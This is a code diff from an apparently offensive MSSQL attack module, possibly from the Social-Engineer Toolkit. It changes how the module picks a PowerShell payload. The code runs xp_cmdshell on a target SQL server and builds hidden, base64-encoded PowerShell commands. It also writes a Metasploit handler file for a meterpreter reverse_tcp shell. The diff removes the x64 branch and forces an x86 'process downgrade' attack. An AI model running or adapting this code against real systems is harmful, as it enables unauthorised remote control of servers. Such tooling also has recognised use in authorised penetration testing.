@@ -150,16 +150,8 @@ def deploy_hex2binary(ipaddr,port,username,password):
     #
 
     if option == "1":
-        print_status("Checking what type of operating system either x86 or x64")
-        mssql.sql_query("exec master..xp_cmdshell 'systeminfo | find /I \"System type\"'")
-        bundle = str(capture(mssql.printRows))
-        match = re.search("X86", bundle)
-        if match:
-            print_status("Windows X86 architecture detected. Selecting powershell injection.")
-            payload = "x86"
-        else:
-            print_status("Windows X64 architecture detected. Selecting powershell injection.")
-            payload = "x64"
+        print_status("Using powershell x86 process downgrade attack..")
+        payload = "x86"
 
         # specify ipaddress of reverse listener
         ipaddr = grab_ipaddress()
@@ -175,32 +167,19 @@ def deploy_hex2binary(ipaddr,port,username,password):
         if not os.path.isdir(setdir + "/reports/powershell"):
             os.makedirs(setdir + "/reports/powershell")
 
-        # here we format everything for us
-        x64 = file(setdir + "/x64.powershell", "r")
-        x64 = x64.read()
-        x64 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x64
         x86 = file(setdir + "/x86.powershell", "r")
         x86 = x86.read()
         x86 = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + x86
         print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
-        filewrite = file(setdir + "/reports/powershell/x64_powershell_injection.txt", "w")
-        filewrite.write(x64)
-        filewrite.close()
         filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
         filewrite.write(x86)
+        filewrite.close()
         # if our payload is x86 based - need to prep msfconsole rc 
         if payload == "x86":
                 powershell_command = x86
                 powershell_dir = setdir + "/reports/powershell/x86_powershell_injection.txt"
                 filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
                 filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
-                filewrite.close()
-        # if our payload ix x64 based - need to prep msfconsole rc
-        if payload == "x64":
-                powershell_command = x64
-                powershell_dir = setdir + "/reports/powershell/x64_powershell_injection.txt"
-                filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
-                filewrite.write("use multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
                 filewrite.close()
 
         # grab the metasploit path from config or smart detection
